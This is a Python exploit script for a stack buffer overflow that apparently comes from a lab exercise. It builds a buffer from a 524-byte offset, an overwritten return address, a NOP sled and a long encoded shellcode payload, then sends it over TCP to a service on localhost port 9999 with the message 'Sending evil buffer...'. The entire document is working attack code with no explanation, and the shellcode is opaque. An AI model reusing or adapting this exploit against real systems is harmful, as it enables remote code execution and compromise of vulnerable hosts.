#!/usr/bin/env python3

import socket

ip = "localhost"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x171"
padding = "\x90" * 16  
payload = ("\xba\x4d\xa5\xf2\xa7\xd9\xcd\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x55\x12\x83\xed\xfc\x03\x18\xab\x10\x52\x5e\x5b\x56"
"\x9d\x9e\x9c\x37\x17\x7b\xad\x77\x43\x08\x9e\x47\x07\x5c\x13"
"\x23\x45\x74\xa0\x41\x42\x7b\x01\xef\xb4\xb2\x92\x5c\x84\xd5"
"\x10\x9f\xd9\x35\x28\x50\x2c\x34\x6d\x8d\xdd\x64\x26\xd9\x70"
"\x98\x43\x97\x48\x13\x1f\x39\xc9\xc0\xe8\x38\xf8\x57\x62\x63"
"\xda\x56\xa7\x1f\x53\x40\xa4\x1a\x2d\xfb\x1e\xd0\xac\x2d\x6f"
"\x19\x02\x10\x5f\xe8\x5a\x55\x58\x13\x29\xaf\x9a\xae\x2a\x74"
"\xe0\x74\xbe\x6e\x42\xfe\x18\x4a\x72\xd3\xff\x19\x78\x98\x74"
"\x45\x9d\x1f\x58\xfe\x99\x94\x5f\xd0\x2b\xee\x7b\xf4\x70\xb4"
"\xe2\xad\xdc\x1b\x1a\xad\xbe\xc4\xbe\xa6\x53\x10\xb3\xe5\x3b"
"\xd5\xfe\x15\xbc\x71\x88\x66\x8e\xde\x22\xe0\xa2\x97\xec\xf7"
"\xc5\x8d\x49\x67\x38\x2e\xaa\xae\xff\x7a\xfa\xd8\xd6\x02\x91"
"\x18\xd6\xd6\x36\x48\x78\x89\xf6\x38\x38\x79\x9f\x52\xb7\xa6"
"\xbf\x5d\x1d\xcf\x2a\xa4\xf6\xfa\xa8\xd9\x69\x93\xae\x25\x67"
"\x3f\x26\xc3\xed\xaf\x6e\x5c\x9a\x56\x2b\x16\x3b\x96\xe1\x53"
"\x7b\x1c\x06\xa4\x32\xd5\x63\xb6\xa3\x15\x3e\xe4\x62\x29\x94"
"\x80\xe9\xb8\x73\x50\x67\xa1\x2b\x07\x20\x17\x22\xcd\xdc\x0e"
"\x9c\xf3\x1c\xd6\xe7\xb7\xfa\x2b\xe9\x36\x8e\x10\xcd\x28\x56"
"\x98\x49\x1c\x06\xcf\x07\xca\xe0\xb9\xe9\xa4\xba\x16\xa0\x20"
"\x3a\x55\x73\x36\x43\xb0\x05\xd6\xf2\x6d\x50\xe9\x3b\xfa\x54"
"\x92\x21\x9a\x9b\x49\xe2\xba\x79\x5b\x1f\x53\x24\x0e\xa2\x3e"
"\xd7\xe5\xe1\x46\x54\x0f\x9a\xbc\x44\x7a\x9f\xf9\xc2\x97\xed"
"\x92\xa6\x97\x42\x92\xe2")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
